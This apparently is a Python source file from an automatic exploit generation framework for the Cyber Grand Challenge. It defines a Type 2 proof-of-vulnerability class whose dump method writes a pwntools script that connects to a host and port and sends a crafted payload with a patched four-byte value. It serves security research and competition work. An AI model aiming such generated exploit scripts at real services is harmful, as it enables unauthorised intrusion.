from rex.exploit import Exploit

class CGCType2Exploit(Exploit):
    '''
    A CGC exploit object, offers more flexibility than an Exploit object for the sake of the game.
    This should represent a Type 2 POV
    https://github.com/CyberGrandChallenge/cgc-release-documentation/blob/master/walk-throughs/understanding-cfe-povs.md
    '''

    def __init__(self, crash, bypasses_nx, bypasses_aslr):
        '''
        :param crash: a crash object which has been modified to exploit a vulnerability
        '''
        super(CGCType2Exploit, self).__init__(crash, bypasses_nx, bypasses_aslr)

        self.cgc_type = 2
        self.addr_idx = None
        self._raw_payload = None

    def dump(self, filename=None):
        '''
        dumps a register setting exploit, depending on the script type specified the exploit will take the value to set
        and final IP value as arguments, either over-the-wire or via the command line
        :param filename: file to write the raw payload to
        '''

        # TODO dump exploit in multiple languages and formats
        return self.dump_python(filename)

    def dump_python(self, filename=None):
        '''
        dump an exploit in the form of a python script
        '''

        payload = """import sys
import time
from pwn import *

if len(sys.argv) < 4:
    print "%s: <host> <port> <value>" % sys.argv[0]
    sys.exit(1)

r = remote(sys.argv[1], sys.argv[2])

value = int(sys.argv[3], 16)

b = bytearray(\"""" + self._raw_payload.encode('hex') + """\".decode('hex'))
b[""" + str(self.addr_idx) + ":" + str(self.addr_idx + 4) + """] = p32(value)

r.send(b)
"""

        if not filename is None:
            with open(filename, 'w') as f:
                f.write(payload)
        else:
            return payload
